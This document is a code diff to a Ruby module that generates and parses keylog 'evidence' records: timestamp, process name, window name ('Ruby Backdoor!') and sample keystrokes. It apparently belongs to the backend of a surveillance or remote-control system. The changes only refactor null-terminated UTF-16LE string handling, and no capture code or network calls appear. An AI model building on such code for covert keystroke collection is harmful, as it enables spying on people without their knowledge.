@@ -7,19 +7,18 @@ module RCS
 module KeylogEvidence
 
   ELEM_DELIMITER = 0xABADC0DE
-  KEYSTROKES = ["привет мир\0", "こんにちは世界\0", "Hello world!\0", "Ciao mondo!\0"]
+  KEYSTROKES = ["привет мир", "こんにちは世界", "Hello world!", "Ciao mondo!"]
   
   def content
-    proc_name = "ruby\0".to_utf16le_binary
-    window_name = "Ruby Backdoor!\0".to_utf16le_binary
+    proc_name = "ruby".to_utf16le_binary_null
+    window_name = "Ruby Backdoor!".to_utf16le_binary_null
     content = StringIO.new
     t = Time.now.getutc
     content.write [t.sec, t.min, t.hour, t.mday, t.mon, t.year, t.wday, t.yday, t.isdst ? 0 : 1].pack('l*')
     content.write proc_name
     content.write window_name
     content.write [ ELEM_DELIMITER ].pack('L*')
-    chosen = KEYSTROKES.sample
-    keystrokes = chosen.to_utf16le_binary
+    keystrokes = KEYSTROKES.sample.to_utf16le_binary_null
     content.write keystrokes
     content.string
   end
@@ -44,15 +43,15 @@ module KeylogEvidence
       @info[:window] = ''
       @info[:keystrokes] = ''
       
-      process_name = stream.read_utf16_string
+      process_name = stream.read_utf16le_string
       @info[:process] = process_name.utf16le_to_utf8 unless process_name.nil?
-      window_name = stream.read_utf16_string
+      window_name = stream.read_utf16le_string
       @info[:window] = window_name.utf16le_to_utf8 unless window_name.nil?
       
       delim = stream.read(4).unpack("L*").first
       raise EvidenceDeserializeError.new("Malformed evidence (missing delimiter)") unless delim == ELEM_DELIMITER
       
-      keystrokes = stream.read_utf16_string
+      keystrokes = stream.read_utf16le_string
       @info[:keystrokes] = keystrokes.utf16le_to_utf8 unless keystrokes.nil?
       
       # this is not the real clone! redefined clone ...
